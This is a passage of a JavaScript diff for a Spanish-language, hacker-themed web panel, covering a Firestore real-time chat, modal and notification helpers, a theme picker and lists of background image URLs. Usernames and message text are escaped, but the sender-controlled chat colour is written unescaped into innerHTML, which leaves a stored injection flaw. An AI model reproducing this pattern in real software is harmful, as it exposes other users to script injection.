+    <div style="background:#000;border:3px solid #0f0;padding:30px 40px;border-radius:12px;box-shadow:0 0 40px #0f0;text-align:center;font-family:monospace;max-width:90%;">
+
+      <h2 style="color:#0f0;margin:0 0 20px;font-size:26px;text-shadow:0 0 15px #0f0;letter-spacing:2px;">${titulo}</h2>
+
+      <p style="color:#0ff;font-size:17px;margin:15px 0;line-height:1.5;">${texto}</p>
+
+      <div style="margin-top:25px;">
+
+        <button id="modalSi" style="background:#0f0;color:#000;padding:12px 30px;margin:0 10px;font-weight:bold;border:none;border-radius:8px;cursor:pointer;font-size:16px;">${btnSi}</button>
+
+        ${btnNo ? `<button id="modalNo" style="background:#300;color:#0f0;padding:12px 30px;margin:0 10px;border:2px solid #0f0;border-radius:8px;cursor:pointer;font-size:16px;">${btnNo}</button>` : ''}
+
+      </div>
+
+    </div>`;
+
+  document.body.appendChild(modal);
+
+  $id("modalSi").onclick = () => { callbackSi(); modal.remove(); };
+
+  if (btnNo) $id("modalNo").onclick = () => modal.remove();
+
+}
+
+function mostrarNotif(texto) {
+
+  const n = document.createElement("div");
+
+  n.textContent = texto;
+
+  n.style.cssText = "position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#0f0;color:#000;padding:12px 30px;border-radius:10px;z-index:99999;font-family:monospace;font-weight:bold;box-shadow:0 0 20px #0f0;";
+
+  document.body.appendChild(n);
+
+  setTimeout(() => n.remove(), 2500);
+
+}
+
+// ================== CHAT OPTIMIZADO: SOLO ÚLTIMOS 20 MENSAJES + TIEMPO REAL ==================
+
+// ================== CHAT OPTIMIZADO: SIN HISTORIAL AL ENTRAR ==================
+
+function iniciarChat() {
+
+    const msgContainer = $id("chatMessages");
+
+    if (!msgContainer) return;
+
+    const userActual = auth.currentUser;
+
+    if (!userActual) {
+
+        console.error("No hay usuario autenticado para el chat.");
+
+        return;
+
+    }
+
+    const uidUsuarioActual = userActual.uid;
+
+    const sonidoMencion = new Audio("https://assets.mixkit.co/sfx/preview/mixkit-software-interface-remove-2577.mp3");
+
+    sonidoMencion.volume = 0.4;
+
+    let resetTimestamp = null;
+
+    let mensajesCargados = new Set(); // Para evitar duplicados
+
+
+
+    // Listener para reset del chat (vaciar solo para mí)
+
+    onSnapshot(doc(db, "userChatStates", uidUsuarioActual), (docSnap) => {
+
+        if (docSnap.exists() && docSnap.data().resetTimestamp) {
+
+            resetTimestamp = docSnap.data().resetTimestamp;
+
+            msgContainer.innerHTML = '<div style="text-align:center;color:#0f0;padding:30px;">Chat vaciado</div>';
+
+            mensajesCargados.clear();
+
+        }
+
+    });
+
+
+
+    // === ESCUCHAR SOLO NUEVOS MENSAJES EN TIEMPO REAL (SIN CARGAR HISTORIAL) ===
+
+    const qRealtime = query(
+
+        collection(db, "chatMensajes"),
+
+        orderBy("fecha", "desc"),
+
+        limit(10) // Límite de escucha para no sobrecargar
+
+    );
+
+    const unsubscribe = onSnapshot(qRealtime, (snapshot) => {
+
+        snapshot.docChanges().forEach((change) => {
+
+            const id = change.doc.id;
+
+            const data = change.doc.data();
+
+            // Ignorar mensajes antiguos si se reseteó el chat
+
+            if (resetTimestamp && data.fecha && data.fecha.toMillis() < resetTimestamp.toMillis()) {
+
+                return;
+
+            }
+
+            // Solo procesar mensajes nuevos
+
+            if (change.type === "added" && !mensajesCargados.has(id)) {
+
+                // Si es el primer mensaje que se recibe, mostrar un aviso y no añadirlo al DOM
+
+                if (mensajesCargados.size === 0) {
+
+                    msgContainer.innerHTML = '<div style="text-align:center;color:#888;padding:20px;">Conectado al chat. Los mensajes nuevos aparecerán aquí.</div>';
+
+                }
+
+                agregarMensajeAlDOM(id, data, uidUsuarioActual);
+
+                mensajesCargados.add(id);
+
+                msgContainer.scrollTop = msgContainer.scrollHeight;
+
+            }
+
+            if (change.type === "modified") {
+
+                const existente = msgContainer.querySelector(`[data-msg-id="${id}"]`);
+
+                if (existente && data.eliminado) {
+
+                    existente.innerHTML = `<em style="color:#888">[Este mensaje fue eliminado]</em>`;
+
+                }
+
+            }
+
+            if (change.type === "removed") {
+
+                const msgElement = msgContainer.querySelector(`[data-msg-id="${id}"]`);
+
+                if (msgElement) msgElement.remove();
+
+            }
+
+        });
+
+    });
+
+
+
+    // Función auxiliar para crear y añadir un mensaje
+
+function agregarMensajeAlDOM(id, data, uidActual) {
+
+    if (msgContainer.querySelector(`[data-msg-id="${id}"]`)) return;
+
+    const esMensajeSistema = data.esMensajeSistema || false;
+
+    const esMio = data.uidRemitente === uidActual; // <-- Esta línea faltaba
+
+    const color = data.colorChat || "#00ff00";
+
+        const div = document.createElement("div");
+
+        div.dataset.msgId = id;
+
+        if (esMensajeSistema) {
+
+  div.style.cssText = "position:relative;padding:10px;background:rgba(255,0,0,0.2);margin:6px 0;border-radius:8px;border-left:4px solid #f00;word-wrap:break-word;color:#fff;font-weight:bold;text-align:center;";
+
+} else {
+
+  div.style.cssText = "position:relative;padding:10px;background:rgba(0,255,0,0.15);margin:6px 0;border-radius:8px;border-left:4px solid #0f0;word-wrap:break-word;color:#fff;";
+
+}
+
+
+
+        function safe(text) {
+
+            const e = document.createElement("div");
+
+            e.textContent = text || "";
+
+            return e.innerHTML;
+
+        }
+
+
+
+        let textoLimpio = safe(data.texto);
+
+        // Negrita y subrayado
+
+        textoLimpio = textoLimpio
+
+            .replace(/\*\*(.*?)\*\*/g, "<b>$1</b>")
+
+            .replace(/__(.*?)__/g, "<u>$1</u>");
+
+
+
+        // Menciones @
+
+        if (data.texto && data.texto.includes("@")) {
+
+            const miNombre = (userActual?.email?.split("@")[0] || "").toLowerCase();
+
+            textoLimpio = textoLimpio.replace(/@([a-zA-Z0-9_]+)/g, (match, usuario) => {
+
+                if (usuario.toLowerCase() === miNombre && data.uidRemitente !== uidActual) {
+
+                    sonidoMencion.play().catch(() => {});
+
+                    return `<span style="background:#f00;color:#fff;padding:2px 8px;border-radius:4px;font-weight:bold;animation:parpadeo 1s infinite">@${usuario}</span>`;
+
+                }
+
+                return `<span style="background:#800;color:#fff;padding:2px 8px;border-radius:4px;font-weight:bold;">@${usuario}</span>`;
+
+            });
+
+        }
+
+
+
+        const nombreUsuario = safe(data.usuario || "Anon");
+
+        div.innerHTML = `<strong style="color:${color}">${nombreUsuario}:</strong> <span>${textoLimpio}</span>`;
+
+
+
+        // Acciones (ocultar / eliminar)
+
+        const acciones = document.createElement("div");
+
+        acciones.style.cssText = "position:absolute;top:5px;right:5px;opacity:0;transition:opacity 0.3s;";
+
+        div.onmouseover = () => acciones.style.opacity = "1";
+
+        div.onmouseout = () => acciones.style.opacity = "0";
+
+
+
+        const btnOcultar = document.createElement("button");
+
+        btnOcultar.textContent = "Ocultar";
+
+        btnOcultar.style.cssText = "background:#f30;color:#fff;padding:2px 6px;margin-right:4px;border:none;border-radius:4px;cursor:pointer;font-size:11px;";
+
+        btnOcultar.onclick = (e) => {
+
+            e.stopPropagation();
+
+            div.remove();
+
+        };
+
+        acciones.appendChild(btnOcultar);
+
+
+
+        if (esMio) {
+
+            const btnEliminar = document.createElement("button");
+
+            btnEliminar.textContent = "Eliminar";
+
+            btnEliminar.style.cssText = "background:#f00;color:#fff;padding:2px 6px;border:none;border-radius:4px;cursor:pointer;font-size:11px;";
+
+            btnEliminar.onclick = (e) => {
+
+                e.stopPropagation();
+
+                mostrarModalPro("ELIMINAR PARA TODOS", "El mensaje será reemplazado por <b style='color:#888'>[Este mensaje fue eliminado]</b> en todos los dispositivos", "ELIMINAR", "Cancelar", async () => {
+
+                    await updateDoc(doc(db, "chatMensajes", id), {
+
+                        texto: "[Este mensaje fue eliminado]",
+
+                        eliminado: true
+
+                    });
+
+                    mostrarNotif("Mensaje eliminado para todos");
+
+                });
+
+            };
+
+            acciones.appendChild(btnEliminar);
+
+        }
+
+
+
+        div.appendChild(acciones);
+
+        msgContainer.appendChild(div);
+
+    }
+
+
+
+    window.chatUnsubscribe = unsubscribe;
+
+
+
+    // === ENVÍO DE MENSAJES (con anti-spam) ===
+
+const enviarMensaje = async () => {
+
+    const texto = $id("chatInput").value.trim();
+
+    if (!texto) return;
+
+    if (!(await checkAntiSpam(texto, uidUsuarioActual))) return;
+
+
+
+    // NUEVO: Guardar el nombre actual del usuario en su documento de Firestore
+
+    const nombreActual = $id("chatUsuario").value.trim() || "Anon";
+
+    try {
+
+        await updateDoc(doc(db, "panelUsers", uidUsuarioActual), {
+
+            usuario: nombreActual
+
+        });
+
+    } catch (error) {
+
+        console.error("Error al actualizar nombre de usuario:", error);
+
+        // No bloqueamos el envío del mensaje si esto falla
+
+    }
+
+
+
+    try {
+
+        await addDoc(collection(db, "chatMensajes"), {
+
+            texto: texto,
+
+            usuario: nombreActual, // Usamos la variable que ya tenemos
+
+            uidRemitente: uidUsuarioActual,
+
+            fecha: serverTimestamp(),
+
+            colorChat: $id("chatColor").value || "#00ff00"
+
+        });
+
+        $id("chatInput").value = "";
+
+    } catch (error) {
+
+        console.error("Error al enviar:", error);
+
+        mostrarNotif("Error al enviar mensaje");
+
+    }
+
+};
+
+
+
+    $id("chatSend").onclick = enviarMensaje;
+
+    $id("chatInput").addEventListener('keypress', (e) => {
+
+        if (e.key === 'Enter' && !e.shiftKey) {
+
+            e.preventDefault();
+
+            enviarMensaje();
+
+        }
+
+    });
+
+
+
+    // Vaciar chat (solo para mí)
+
+    window.vaciarChat = async () => {
+
+        mostrarModalPro(
+
+            "VACIAR CHAT",
+
+            "Esto limpiará el chat solo para ti. ¿Continuar?",
+
+            "VACIAR",
+
+            "CANCELAR",
+
+            async () => {
+
+                try {
+
+                    await setDoc(doc(db, "userChatStates", uidUsuarioActual), {
+
+                        resetTimestamp: serverTimestamp()
+
+                    }, { merge: true });
+
+                    msgContainer.innerHTML = `<div style="text-align:center;color:#0f0;padding:30px;">Chat vaciado</div>`;
+
+                    mensajesCargados.clear();
+
+                    mostrarNotif("Chat vaciado exitosamente.");
+
+                } catch (error) {
+
+                    console.error("Error al vaciar:", error);
+
+                }
+
+            }
+
+        );
+
+    };
+
+
+
+    const style = document.createElement('style');
+
+    style.textContent = `@keyframes parpadeo { 0%,100% { opacity:1 } 50% { opacity:0.5 } }`;
+
+    document.head.appendChild(style);
+
+}
+
+// ================== CAMBIAR TEMA ==================
+
+// (Igual, todo el bloque de abrirVentanaColores, restaurarTemaOriginal, cerrarVentanaColores)
+
+window.abrirVentanaColores = () => {
+
+  const v = $id("ventanaColores");
+
+  const box = $id("todosColores");
+
+  v.style.display = "flex";
+
+  box.innerHTML = "";
+
+  for (let i = 0; i < 600; i++) {
+
+    const color = `hsl(${i*0.6},90%,60%)`;
+
+    const d = document.createElement("div");
+
+    d.style.cssText = `width:40px;height:40px;border-radius:5px;cursor:pointer;background:${color};border:2px solid #000;`;
+
+    d.onclick = () => {
+
+      document.querySelectorAll(".btn,#menuBtn,#fakeSelect,#panel,#ventanaAcortador,#registros,#chatInput,#chatMessages,#chatUsuario,#chatSend,.contactoLink,#usuariosOnlineBox div,input,textarea").forEach(el => {
+
+        el.style.borderColor = color;
+
+        el.style.boxShadow = `0 0 15px ${color}`;
+
+      });
+
+      if (window.binarios) window.binarios.color = color;
+
+      v.style.display = "none";
+
+    };
+
+    box.appendChild(d);
+
+  }
+
+};
+
+window.restaurarTemaOriginal = () => {
+
+  document.querySelectorAll(".btn,#menuBtn,#fakeSelect,#panel,#ventanaAcortador,#registros,#chatInput,#chatMessages,#chatUsuario,#chatSend,.contactoLink,#usuariosOnlineBox div,input,textarea").forEach(el => {
+
+    el.style.borderColor = "#00ff00";
+
+    el.style.boxShadow = "0 0 15px #00ff00";
+
+  });
+
+  if (window.binarios) window.binarios.color = "#00ff00";
+
+  $id("ventanaColores").style.display = "none";
+
+};
+
+window.cerrarVentanaColores = () => $id("ventanaColores").style.display = "none";
+
+// ================== FONDOS ENLACES E INICIO ==================
+
+const imagenesEnlaces = [
+
+  "https://i.postimg.cc/Kzd3dV54/360-F-641949215-SRk6Gy-MXUSbp-Hzpi7knb-HHjpua-ZF6Ffy.jpg",
+
+  "https://i.postimg.cc/P53xg9tm/360-F-574955019-gk0Efa-Pbwa-Iz-Rf3Ht-S8KJd-Kmdu-Ox8V5G.jpg",
+
+  "https://i.postimg.cc/0yyW5WSz/71bb561f7df207bd3b10f9ecdfe5d6be.png",
+
+  "https://i.postimg.cc/GpSZ10Sw/76be013858034851a9fbfae176741356.webp",
+
+  "https://i.postimg.cc/gkqQ2LBK/kali-linux-os-dragon-japanese-9bmrmf3ea24e3uwe.jpg",
+
+  "https://i.postimg.cc/VNSKnJD5/linux-mint-linux-computer-hd-wallpaper-thumb.jpg",
+
+  "https://i.postimg.cc/cJKFwvTP/top-10-hackers-of-all-time-the-real-list.jpg",
+
+  "https://i.postimg.cc/fb6BKMrY/vetor-do-cranio-do-fundo-do-ataque-do-hacker-cibernetico-42077-12551.jpg",
+
+  "https://i.postimg.cc/13TCMbXk/hacker-mirando-la-camara-con-una-mascara-facial-fondo-de-pantalla-tema-oscuro-generado-por.jpg",
+
+  "https://i.postimg.cc/QdLTXr4q/0lu7hombgh871.jpg",
+
+  "https://i.postimg.cc/wjc7gRsg/0Zbj-LS.jpg",
+
+  "https://i.postimg.cc/RhsLPb4j/1.jpg",
+
+  "https://i.postimg.cc/sDMYjmVy/112976872-m-webp-width-1170-name-112976872-m.jpg",
+
+  "https://i.postimg.cc/6Qnz90fN/240508-8.jpg",
+
+  "https://i.postimg.cc/9Mf4xX0m/34.jpg",
+
+  "https://i.postimg.cc/T2C0Yhg7/6a792500-63b5-11f0-8dbd-f3d32ebd3327.jpg",
+
+  "https://i.postimg.cc/28W19Kkz/757aab31c810686b617bc58d4285ad8e.jpg",
+
+  "https://i.postimg.cc/vTk6xRQb/Alexandra-Sasha-cyber-security-hacker-cool-computer-binary-code-770cfb43-762a-4503-a16f-0735ae3bf602.png",
+
+  "https://i.postimg.cc/50Pz1YTx/An-Ninh-Mang-2.jpg",
+
+  "https://i.postimg.cc/s2mQ9GVK/anonymous-hackers-wallpaper-preview.jpg",
+
+  "https://i.postimg.cc/1tSB4qvN/articulos-45009.jpg",
+
+  "https://i.postimg.cc/dtN5nD0K/bjaeq21knen81.png",
+
+  "https://i.postimg.cc/mrLhDZQN/blood-dragon-1920x1080-red-wallpaper-thumb.jpg",
+
+  "https://i.postimg.cc/k5mKydKz/Cyber-Security-Threats-min-resized-89e4bf5bf7c909abfce90d645349cdbb4456e945.png",
+
+  "https://i.postimg.cc/PJxm8zY2/hacker-attack-975yt.jpg",
+
+  "https://i.postimg.cc/5975WTWR/hacker-attack-breach-freepik.jpg",
+
+  "https://i.postimg.cc/WzXXB16X/Hackers-2.jpg",
+
+  "https://i.postimg.cc/FKVcWnxL/hackers-pose-one-type-of-cybersecurity-threat-to-small-businesses.jpg",
+
+  "https://i.postimg.cc/cCpr4Qm6/HD-wallpaper-anonymous-truth-world-save.jpg",
+
+  "https://i.postimg.cc/SR2nhZcf/large.jpg",
+
+  "https://i.postimg.cc/3J0G5wBQ/luminous-red-anonymous-2wrm4j7avzuqqm4d.jpg",
+
+  "https://i.postimg.cc/50m3z2rK/pngtree-d-render-of-computer-screen-terminal-with-hacker-code-streaming-down-image-3880541.png",
+
+  "https://i.postimg.cc/MHKYm82H/pngtree-hacker-programmer-on-neon-background-picture-image-15707642.png",
+
+  "https://i.postimg.cc/Kcq7hwh1/shutterstock-1916985977-e1703134556975.jpg",
+
+  "https://i.postimg.cc/XJN5Tc2h/Top-5-Cybersecurity-Threats-in-2024-and-How-to-Mitigate-Them-scaled.jpg",
+
+  "https://i.postimg.cc/CxWmTtDQ/wp15527523.jpg"
+
+];
+
+const imagenesInicio = [
+
+  "https://i.postimg.cc/d18JVxYv/images-(57).jpg",
+
+  "https://i.postimg.cc/TY2TT0NB/264ff8b84e19d157fc9cb9f9698abe72.jpg",
+
+  "https://i.postimg.cc/52TJqV9M/images-(56).jpg",
+
+  "https://i.postimg.cc/hjbqBQLS/images-(55).jpg",
+
+  "https://i.postimg.cc/YqyBMHWS/images-(54).jpg",
+
+  "https://i.postimg.cc/XvdRfBDw/HD-wallpaper-hacker-hack.jpg",
+
+  "https://i.postimg.cc/WzWCNGh4/images-(53).jpg",
+
+  "https://i.postimg.cc/Sxz34z4T/images-(52).jpg",
+
+  "https://i.postimg.cc/3wXq45dF/images-(51).jpg",
+
+  "https://i.postimg.cc/zXyPwRyv/images-(50).jpg",
+
+  "https://i.postimg.cc/xd2xSxtK/images-(49).jpg",
+
+  "https://i.postimg.cc/Px62YthZ/images-(48).jpg",
+
+  "https://i.postimg.cc/VvpgZDJB/images-(47).jpg",
+
+  "https://i.postimg.cc/y8FjnhsS/images-(46).jpg",
+
+  "https://i.postimg.cc/WzF6Zg5V/images-(45).jpg",
+
+  "https://i.postimg.cc/7PdjWV8m/images-(44).jpg",
+
+  "https://i.postimg.cc/dVmXDc7X/images-(43).jpg",
+
+  "https://i.postimg.cc/q715Xcxx/images-(42).jpg",
+
+  "https://i.postimg.cc/5yCKVhdm/images-(41).jpg",
+
+  "https://i.postimg.cc/Hxf3B6cH/images-(40).jpg",
+
+  "https://i.postimg.cc/yYCvRrCP/images-(39).jpg",
+
+  "https://i.postimg.cc/Z5KPPG7p/images-(38).jpg",
+
+  "https://i.postimg.cc/T3wm5r10/images-(37).jpg",
+
+  "https://i.postimg.cc/TYk5xp0S/images-(36).jpg",
+
+  "https://i.postimg.cc/02r2pZGy/images-(35).jpg",
+
+  "https://i.postimg.cc/pT2PyBX8/1.jpg",
+
+  "https://i.postimg.cc/mDbThS2z/16eb525d0e0462d64cb411bd8e64f22d-(1).jpg",
+
+  "https://i.postimg.cc/26zC3x8j/9b1ec57e6c3138a53edbfe5a4b59c5ba-(1).jpg",
+
+  "https://i.postimg.cc/d1qJD9t7/images-(24).jpg",
+
+  "https://i.postimg.cc/3RK3WZJw/images-(26).jpg",
+
+  "https://i.postimg.cc/wv693kT9/images-(27).jpg",
+
+  "https://i.postimg.cc/HL0ppNHL/images-(28).jpg",
+
+  "https://i.postimg.cc/jj6ss1Kb/images-(29).jpg",
+
+  "https://i.postimg.cc/SKLyyPqN/images-(30).jpg",
+
+  "https://i.postimg.cc/W4m22yjV/images-(32).jpg",
+
+  "https://i.postimg.cc/bv0zz58f/images-(33).jpg",
+
+  "https://i.postimg.cc/rpG88HT7/images-(34).jpg",
+
+  "https://i.postimg.cc/5t407KG4/hacker-background-h6eyqo91lpkgq4my.jpg",
+
+  "https://i.postimg.cc/x1stx8Tn/03cc17bcbadd24576e56973a97466661.jpg",
+
+  "https://i.postimg.cc/RhXHS3YB/1447928de98a856b3d422a20079c1ba3.jpg",
+
+  "https://i.postimg.cc/hGzb205x/158fbf8276529dc1e0d3c60846736890.jpg",
+
+  "https://i.postimg.cc/qMvKmLtQ/185387.jpg",
+
+  "https://i.postimg.cc/2SCK9gQh/1MM-380.webp",
+
+  "https://i.postimg.cc/bwGtPw9f/2f7da32bdb8b8e7f320c7ce2ae69a28a.jpg",
+
+  "https://i.postimg.cc/c4n9J0m3/360-F-206197131-3z-Cz-OXo-Hnh-ABEk-XGbqb-Dbmd-Bw-MGos-DIl.jpg",
+
+  "https://i.postimg.cc/c4wpbQVy/360-F-598226410-hwu0HTRm-Ikoygfb-ADWLg0Es6fgv7c-Qq0.jpg",
+
+  "https://i.postimg.cc/y8TwV767/360-F-608789044-me2Pt-F6ogx-ZKxd-Vzr-Blmt2ZYq-Mo-Z5z0E.jpg",
+
+  "https://i.postimg.cc/wTg29L1x/36e29fb333167866e9f4961fd686cc6a.jpg",
+
+  "https://i.postimg.cc/7ZpTZrK5/46c72b16317fef529fa5595143f6e8bc.jpg",
+
+  "https://i.postimg.cc/90W9HPJK/4b77e726b288a4d816cb2e3c194b8954.jpg",
+
+  "https://i.postimg.cc/TwvmCvmP/54006b42e589a12e78abd06ac6550805.jpg",
+
+  "https://i.postimg.cc/YCSxW7fB/56eebd8d4ff4117b40cc8b38d6383378.jpg",
+
+  "https://i.postimg.cc/0yrpNfPg/596ab1abdadd14f5d4b159256b8dce41.jpg",
+
+  "https://i.postimg.cc/BQBhFNrX/5b3bfd4d477b5d3768c39bd7d721d16c.jpg",
+
+  "https://i.postimg.cc/bYTbHMvY/5de38645b8a8a7edbf104a4cf3b967be.jpg",
+
+  "https://i.postimg.cc/44M2Zmzs/79065a72faea7decf81ebd10de644c32.jpg",
+
+  "https://i.postimg.cc/HnByYJNb/7cca66e6bc4a1ba447e7819463202526.jpg",
+
+  "https://i.postimg.cc/5tTpJrzd/a0808bb2f535b0b544f7725ebc2cb13b.jpg",
+
+  "https://i.postimg.cc/PrSWhcGC/a5cc22c43642ee40a75665208c8d388d.jpg",
+
+  "https://i.postimg.cc/5Ng3yyzq/Anonymous-Earth-iPhone-Wallpaper-4K.jpg",
+
+  "https://i.postimg.cc/k4NSHYFN/c0de7e8eab6a3d39238d36732ada3ade.jpg",
+
+  "https://i.postimg.cc/FzgxjsnW/c6d8a194464d693fd533fd10500781e7.jpg",
+
+  "https://i.postimg.cc/DfdQp0xf/cfd6c4a02a9237921c1d1c414c831031.jpg",
+
+  "https://i.postimg.cc/FHGnMGGm/concepto-de-seguridad-hacker-sin-rostro-en-el-trabajo-con-la-inscripcion-pirateria-et.jpg",
+
+  "https://i.postimg.cc/ZnhcByjC/d69d3152570a367eecb6ca3b52cdf720.jpg",
+
+  "https://i.postimg.cc/G3sV4F3Q/depositphotos-710393540-stock-photo-faceless-hacker-hacking-inscription-binary.webp",
+
+  "https://i.postimg.cc/VvRjJZJ0/desktop-wallpaper-guy-fawkes-mask-anon-mask.jpg",
+
+  "https://i.postimg.cc/WpMSRXb8/desktop-wallpaper-iphone-for-iphone-8-iphone-8-plus-iphone-6s-iphone-6s-plus-iphone-x-and-ipod-touch.jpg",
+
+  "https://i.postimg.cc/d0yr2Vhf/e83ca84415892f958189823dbf647e34.jpg",
+
+  "https://i.postimg.cc/K8Vt3M8B/fbc0925ccbc21d2bfa35fe57d606a528.jpg",
+
+  "https://i.postimg.cc/tTJDGjVv/fondo-de-codigo-verde-pirateria-en-curso.jpg",
+
+  "https://i.postimg.cc/2SNHbMcH/G6ba-Fm.jpg",
+
+  "https://i.postimg.cc/Y9vVfg1X/hacker-g1e3a44200-1920-b6ba00f811758a41c98bff2db4b9e3e4-2000.jpg",
+
+  "https://i.postimg.cc/HxFNSxz5/hacker-group-names-are-now-absurdly-out-of-control-v0-e5o1bw2DPr666vpx8NI3CZm-BCo-ESLyjff-QOo-Kn-N-k.jpg",
+
+  "https://i.postimg.cc/FzcBw4CG/hacking-ciberseguridad.jpg",
+
+  "https://i.postimg.cc/4dpvgxZJ/HD-wallpaper-anonymous-hack.jpg",
+
+  "https://i.postimg.cc/6qwr5x5m/HD-wallpaper-anonymous-mask-smoke-iphone-iphone-iphone.jpg",
+
+  "https://i.postimg.cc/jqN3xRv8/HD-wallpaper-kali-linux-neon-kali-linux-neon-thumbnail.jpg",
+
+  "https://i.postimg.cc/GhC796Sf/images-r-bCqBCLR5XiHul6s3TDDxD71QMB273IbthMfxg75k8GkKqBTmzDOYA5YujiWfmd3yjPBGAyVPn6LJDQe.webp",
+
+  "https://i.postimg.cc/KYRQdbRr/kali-linux-neon-dragon-968bqdlzy2n7tfu3.webp",
+
+  "https://i.postimg.cc/90GLJBr3/kali-linux-silver-dragon-vj6bgoy7ysr3s6ag.jpg",
+
+  "https://i.postimg.cc/vHrKzGVy/pngtree-security-concept-lock-on-digital-screen-locks-hacker-protection-photo-picture-image-6526616.png",
+
+  "https://i.postimg.cc/jC0hfnXc/the-anonymus-guy-lb.jpg",
+
+  "https://i.postimg.cc/Y9Lnm774/wired-placeholder-dummy.jpg",
+
+  "https://i.postimg.cc/Jz7p5Z8x/wp13404605.jpg",
+
+  "https://i.postimg.cc/KY67wMXb/wp14671539.jpg",
+
+  "https://i.postimg.cc/6pVMdcFT/wp2697320.jpg"
+
+];
+
+window.mostrarOcultarImagenesFondoEnlaces = () => {
+
+  const cont = $id("imagenesFondoEnlaces");
+
+  const lista = $id("imagenesEnlacesLista");
+
+  cont.style.display = cont.style.display === "block" ? "none" : "block";
+
+  if (cont.style.display === "block" && lista.innerHTML === "") {
+
+    imagenesEnlaces.forEach(img => {
+
+      const el = document.createElement("img");
+
+      el.src = img;
+
+      el.style.cssText = "width:100%;height:auto;cursor:pointer;border:3px solid #0f0;border-radius:8px;margin:6px 0;box-shadow:0 0 15px #0f0;";
+
+      el.onclick = () => {
+
+        $id("optionsList").style.backgroundImage = `url(${img})`;
+
+        $id("optionsList").style.backgroundSize = "cover";
+
+        localStorage.setItem("fondoEnlaces", img);
+
+        cont.style.display = "none";
+
+      };
+
+      lista.appendChild(el);
+
+    });
+
+  }
+
+};
+
+window.mostrarOcultarImagenesFondoInicio = () => {
+
+  const cont = $id("imagenesFondoInicio");
+
+  const lista = $id("imagenesInicioLista");
+
+  cont.style.display = cont.style.display === "block" ? "none" : "block";
+
+  if (cont.style.display === "block" && lista.innerHTML === "") {
+
+    imagenesInicio.forEach(img => {
+
+      const el = document.createElement("img");
+
+      el.src = img;
+
+      el.style.cssText = "width:100%;height:auto;cursor:pointer;border:3px solid #0f0;border-radius:8px;margin:6px 0;box-shadow:0 0 15px #0f0;";
+
+      el.onclick = () => {
+
+        document.body.style.background = `url('${img}') center/cover no-repeat fixed`;
+
+        localStorage.setItem("fondoInicio", img);
+
+        cont.style.display = "none";
+
+      };
+
+      lista.appendChild(el);
+
+    });
+
+  }
+
+};
+
+function cargarFondosGuardados() {
+
+  const fondoEnlaces = localStorage.getItem("fondoEnlaces");
+
+  const fondoInicio = localStorage.getItem("fondoInicio");
+
+  if (fondoEnlaces) $id("optionsList").style.backgroundImage = `url(${fondoEnlaces})`;
+
+  if (fondoInicio) document.body.style.background = `url('${fondoInicio}') center/cover no-repeat fixed`;
+
+}
+
+window.addEventListener("load", cargarFondosGuardados);
+
+// ================== FONDO MENÚ LATERAL ==================
+
+const imagenesMenuLateral = [
+
+  "https://i.postimg.cc/d18JVxYv/images-(57).jpg",
+
+  "https://i.postimg.cc/TY2TT0NB/264ff8b84e19d157fc9cb9f9698abe72.jpg",
+
+  "https://i.postimg.cc/52TJqV9M/images-(56).jpg",
+
+  "https://i.postimg.cc/hjbqBQLS/images-(55).jpg",
+
+  "https://i.postimg.cc/YqyBMHWS/images-(54).jpg",
+
+  "https://i.postimg.cc/XvdRfBDw/HD-wallpaper-hacker-hack.jpg",
+
+  "https://i.postimg.cc/WzWCNGh4/images-(53).jpg",
+
+  "https://i.postimg.cc/Sxz34z4T/images-(52).jpg",
+
+  "https://i.postimg.cc/3wXq45dF/images-(51).jpg",
+
+  "https://i.postimg.cc/zXyPwRyv/images-(50).jpg",
+
+  "https://i.postimg.cc/xd2xSxtK/images-(49).jpg",
+
+  "https://i.postimg.cc/Px62YthZ/images-(48).jpg",
+
+  "https://i.postimg.cc/VvpgZDJB/images-(47).jpg",
+
+  "https://i.postimg.cc/y8FjnhsS/images-(46).jpg",
+
+  "https://i.postimg.cc/WzF6Zg5V/images-(45).jpg",
+
+  "https://i.postimg.cc/7PdjWV8m/images-(44).jpg",
+
+  "https://i.postimg.cc/dVmXDc7X/images-(43).jpg",
+
+  "https://i.postimg.cc/q715Xcxx/images-(42).jpg",
+
+  "https://i.postimg.cc/5yCKVhdm/images-(41).jpg",
+
+  "https://i.postimg.cc/Hxf3B6cH/images-(40).jpg",
+
+  "https://i.postimg.cc/yYCvRrCP/images-(39).jpg",
+
+  "https://i.postimg.cc/Z5KPPG7p/images-(38).jpg",
+
+  "https://i.postimg.cc/T3wm5r10/images-(37).jpg",
+
+  "https://i.postimg.cc/TYk5xp0S/images-(36).jpg",
+
+  "https://i.postimg.cc/02r2pZGy/images-(35).jpg",
+
+  "https://i.postimg.cc/pT2PyBX8/1.jpg",
+
+  "https://i.postimg.cc/mDbThS2z/16eb525d0e0462d64cb411bd8e64f22d-(1).jpg",
+
+  "https://i.postimg.cc/26zC3x8j/9b1ec57e6c3138a53edbfe5a4b59c5ba-(1).jpg",
+
+  "https://i.postimg.cc/d1qJD9t7/images-(24).jpg",
+
+  "https://i.postimg.cc/3RK3WZJw/images-(26).jpg",
+
+  "https://i.postimg.cc/wv693kT9/images-(27).jpg",
+
+  "https://i.postimg.cc/HL0ppNHL/images-(28).jpg",
+
+  "https://i.postimg.cc/jj6ss1Kb/images-(29).jpg",
+
+  "https://i.postimg.cc/SKLyyPqN/images-(30).jpg",
+
+  "https://i.postimg.cc/W4m22yjV/images-(32).jpg",
+
+  "https://i.postimg.cc/bv0zz58f/images-(33).jpg",
+
+  "https://i.postimg.cc/rpG88HT7/images-(34).jpg",
+
+  "https://i.postimg.cc/5t407KG4/hacker-background-h6eyqo91lpkgq4my.jpg",
+
+  "https://i.postimg.cc/x1stx8Tn/03cc17bcbadd24576e56973a97466661.jpg",
+
+  "https://i.postimg.cc/RhXHS3YB/1447928de98a856b3d422a20079c1ba3.jpg",
+
+  "https://i.postimg.cc/hGzb205x/158fbf8276529dc1e0d3c60846736890.jpg",
+
+  "https://i.postimg.cc/qMvKmLtQ/185387.jpg",
+
+  "https://i.postimg.cc/2SCK9gQh/1MM-380.webp",
+
+  "https://i.postimg.cc/bwGtPw9f/2f7da32bdb8b8e7f320c7ce2ae69a28a.jpg",
+
+  "https://i.postimg.cc/c4n9J0m3/360-F-206197131-3z-Cz-OXo-Hnh-ABEk-XGbqb-Dbmd-Bw-MGos-DIl.jpg",
+
+  "https://i.postimg.cc/c4wpbQVy/360-F-598226410-hwu0HTRm-Ikoygfb-ADWLg0Es6fgv7c-Qq0.jpg",
+
